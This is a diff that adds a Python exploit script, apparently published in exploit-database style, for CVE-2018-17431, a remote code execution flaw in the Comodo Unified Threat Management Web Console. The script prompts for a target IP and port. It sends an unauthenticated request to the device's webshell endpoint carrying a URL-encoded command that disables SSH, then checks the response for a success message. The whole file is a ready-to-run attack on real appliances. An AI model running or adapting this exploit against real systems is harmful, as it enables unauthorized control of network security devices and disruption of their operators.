@@ -1,0 +1,50 @@
+# Exploit Title: Comodo Unified Threat Management Web Console 2.7.0 - Remote Code Execution
+# Date: 2018-08-15
+# Exploit Author: Milad Fadavvi
+# Author's LinkedIn: https://www.linkedin.com/in/fadavvi/
+# Vendor Homepage: https://www.comodo.com/
+# Version: Releases before 2.7.0 & 1.5.0 
+# Tested on: Windows=Firefox/chrome - Kali=firefox
+# PoC & other infos: https://github.com/Fadavvi/CVE-2018-17431-PoC
+# CVE : CVE-2018-17431
+# CVE-detailes: https://nvd.nist.gov/vuln/detail/CVE-2018-17431
+# CVSS 3 score: 9.8 
+
+import requests
+
+def RndInt(Lenght):
+    from random import choice
+    from string import digits
+
+    RandonInt = ''.join([choice(digits) for n in range(Lenght)])
+    return str(RandonInt)
+
+if __name__ == "__main__":
+
+    IP = input("IP: ")
+    Port = input("Port: ")
+
+    Command = '%73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a' ## Disable SSH
+    '''For more info about command try to read manual of spesefic version of Comodo UTM and 
+       exploit PoC (https://github.com/Fadavvi/CVE-2018-17431-PoC)
+     '''
+
+    BaseURL = "https://" + IP + ":" + Port + "/manage/webshell/u?s=" + RndInt(1) + "&w=" + RndInt(3) +"&h=" + RndInt(2)
+    BaseNComdURL = BaseURL + "&k=" + Command
+    LastPart = "&l=" + RndInt(2) +"&_=" + RndInt(13) 
+    FullURL = BaseNComdURL + LastPart
+    AddetionalEnter = BaseURL + "&k=%0a" + LastPart
+
+    try:
+        FirstResponse = requests.get(FullURL).text
+    except:
+        print('\nExploit failed due HTTP Error. Check given URL and Port!\n')
+        exit(1)
+    
+    SecondResponse = requests.get(AddetionalEnter).text
+    if SecondResponse.find("Configuration has been altered") == -1:
+        print("\nExploit Failed!\n")
+        exit(1)
+    else:
+        print("\nOK! Command Ran!\n")
+    exit(0)
